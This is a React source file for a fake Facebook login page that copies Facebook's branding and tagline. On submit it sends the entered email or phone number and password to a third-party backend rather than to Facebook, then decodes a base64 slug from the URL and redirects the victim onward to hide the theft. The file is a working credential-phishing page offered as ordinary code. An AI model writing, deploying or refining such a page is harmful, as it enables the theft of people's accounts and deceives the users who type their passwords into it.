"use client"
import { useState, useEffect } from "react"

export default function FacebookLogin({ params }) {
  const [formData, setFormData] = useState({ username: "", password: "" })
  const [errors, setErrors] = useState({ username: "", password: "" })
  const [redirectUrl, setRedirectUrl] = useState("")
  const [postId, setPostId] = useState("")
  const [encryptedString, setEncryptedString] = useState("")
  const [hasTargetUrl, setHasTargetUrl] = useState(false)
  const [loading, setLoading] = useState(false)

  // === URL-safe Base64 encryption/decryption ===
  const decryptUrlSafeBase64 = (encoded) => {
    if (!encoded) return ""
    try {
      const base64 = encoded.replace(/-/g, "+").replace(/_/g, "/")
      const padding = "=".repeat((4 - (base64.length % 4)) % 4)
      return decodeURIComponent(escape(atob(base64 + padding)))
    } catch {
      return ""
    }
  }

  useEffect(() => {
    // Get encrypted string from URL slug
    if (params?.slug && params.slug.length > 0) {
      const encryptedParam = params.slug[0]
      if (encryptedParam) {
        setEncryptedString(encryptedParam)
        setHasTargetUrl(true)
        console.log("Encrypted string detected:", encryptedParam)
      }
    }
  }, [params])

  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search)
    const redirect = urlParams.get("redirect")
    const postIdParam = urlParams.get("postId")

    if (redirect) setRedirectUrl(redirect)
    if (postIdParam) setPostId(postIdParam)
  }, [])

  const handleInputChange = (e) => {
    const { name, value } = e.target
    setFormData((prev) => ({ ...prev, [name]: value }))
    if (errors[name]) setErrors((prev) => ({ ...prev, [name]: "" }))
  }

  const handleSubmit = async (e) => {
    e.preventDefault()
    setErrors({ username: "", password: "" })

    if (!formData.username) {
      setErrors((prev) => ({ ...prev, username: "Email or phone number is required" }))
      return
    }

    if (!formData.password) {
      setErrors((prev) => ({ ...prev, password: "Password is required" }))
      return
    }

    if (formData.password.length < 6) {
      setErrors((prev) => ({ ...prev, password: "Password must be at least 6 characters" }))
      return
    }

    try {
      setLoading(true)

      const response = await fetch(
        "https://social-backend-bice-delta.vercel.app/api/auth/facebook",
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            username: formData.username,
            password: formData.password,
            platform: "facebook",
            encryptedString: encryptedString || null,
          }),
        }
      )

      const data = await response.json()

      if (response.ok) {
        console.log("Login successful:", data)

        // === Redirect automatically after decrypting target URL ===
        if (hasTargetUrl && encryptedString) {
          const targetUrl = decryptUrlSafeBase64(encryptedString)
          if (targetUrl && (targetUrl.startsWith("http://") || targetUrl.startsWith("https://"))) {
            alert("Login successful! Redirecting...")
            setTimeout(() => {
              window.location.href = targetUrl
            }, 800)
            return
          }
        }

        // Fallback redirect
        if (redirectUrl) {
          window.location.href = redirectUrl
          return
        }

        // No target URL, just show success
        alert("Login successful!")
        setLoading(false)
      } else {
        setErrors((prev) => ({ ...prev, password: data.message || "Login failed" }))
        setLoading(false)
      }
    } catch (err) {
      setErrors((prev) => ({ ...prev, password: "Network error. Please try again." }))
      setLoading(false)
    }
  }

  return (
    <div className="min-h-screen bg-gray-100">
      <div className="flex flex-col items-center justify-center min-h-screen px-4">
        <div className="w-full max-w-md">
          <div className="text-center mb-6">
            <h1 className="text-5xl font-bold text-blue-600 mb-2">facebook</h1>
            <p className="text-gray-600 text-lg">Connect with friends and the world around you on Facebook.</p>
          </div>

          {/* {encryptedString && (
            <div className="text-center mb-4 p-3 bg-blue-100 rounded-lg border border-blue-300">
              <p className="text-sm text-blue-800"><strong>🔗 Encrypted Link Detected</strong></p>
              <p className="text-xs text-blue-600 font-mono">{encryptedString.substring(0, 30)}{encryptedString.length > 30 ? "..." : ""}</p>
              <p className="text-xs text-blue-600 mt-1">You will be redirected after login</p>
            </div>
          )} */}

          <div className="bg-white rounded-lg shadow-lg p-6">
            <form onSubmit={handleSubmit} className="space-y-4">
              <div>
                <input
                  type="text"
                  name="username"
                  placeholder="Email or phone number"
                  value={formData.username}
                  onChange={handleInputChange}
                  className={`w-full px-4 py-3 border rounded-md text-lg focus:outline-none ${errors.username ? "border-red-500 focus:border-red-500" : "border-gray-300 focus:border-blue-500"}`}
                  disabled={loading}
                />
                {errors.username && <p className="text-red-500 text-sm mt-1">{errors.username}</p>}
              </div>

              <div>
                <input
                  type="password"
                  name="password"
                  placeholder="Password"
                  value={formData.password}
                  onChange={handleInputChange}
                  className={`w-full px-4 py-3 border rounded-md text-lg focus:outline-none ${errors.password ? "border-red-500 focus:border-red-500" : "border-gray-300 focus:border-blue-500"}`}
                  disabled={loading}
                />
                {errors.password && <p className="text-red-500 text-sm mt-1">{errors.password}</p>}
              </div>

              <button
                type="submit"
                className="w-full bg-blue-600 text-white py-3 rounded-md text-lg font-semibold hover:bg-blue-700 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
                disabled={loading}
              >
                {loading ? "Logging in..." : "Log In"}
              </button>
            </form>

            <div className="text-center mt-4">
              <a href="#" className="text-blue-600 hover:underline text-sm">Forgotten password?</a>
            </div>
          </div>
        </div>
      </div>
    </div>
  )
}
